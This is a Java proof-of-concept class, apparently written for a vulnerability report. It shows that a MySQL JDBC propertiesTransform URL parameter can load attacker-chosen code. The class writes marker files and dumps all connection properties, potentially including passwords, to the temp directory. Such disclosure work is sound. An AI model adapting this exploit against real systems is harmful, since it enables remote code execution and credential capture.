import java.util.Properties;
import java.io.*;

/**
 * Proof-of-concept ConnectionPropertiesTransform implementation.
 * When MySQL driver loads this class via propertiesTransform URL param,
 * transformProperties() is called with ALL connection properties.
 * This proves arbitrary code execution.
 */
public class EvilTransform implements com.mysql.cj.conf.ConnectionPropertiesTransform {
    
    static {
        // Static initializer runs during Class.forName()
        try {
            File marker = new File(System.getProperty("java.io.tmpdir"), "JDBC_CVE_POC_STATIC_INIT.txt");
            new FileWriter(marker).close();
            System.err.println("[POC] Static init: wrote " + marker.getAbsolutePath());
        } catch (Exception e) {}
    }
    
    public EvilTransform() {
        // Constructor runs during newInstance()
        try {
            File marker = new File(System.getProperty("java.io.tmpdir"), "JDBC_CVE_POC_CONSTRUCTOR.txt");
            new FileWriter(marker).close();
            System.err.println("[POC] Constructor: wrote " + marker.getAbsolutePath());
        } catch (Exception e) {}
    }
    
    @Override
    public Properties transformProperties(Properties props) {
        // THIS IS CALLED with all connection properties!
        // Full RCE: attacker controls class AND gets method callback with data
        try {
            File marker = new File(System.getProperty("java.io.tmpdir"), "JDBC_CVE_POC_TRANSFORM_CALLED.txt");
            FileWriter fw = new FileWriter(marker);
            fw.write("transformProperties() called at " + new java.util.Date() + "\n");
            fw.write("Properties received:\n");
            for (String key : props.stringPropertyNames()) {
                fw.write("  " + key + "=" + props.getProperty(key) + "\n");
            }
            fw.write("\nThis proves full code execution via propertiesTransform.\n");
            fw.write("Attacker can execute arbitrary code here.\n");
            fw.close();
            System.err.println("[POC] transformProperties() called! Wrote " + marker.getAbsolutePath());
        } catch (Exception e) {}
        return props;
    }
}
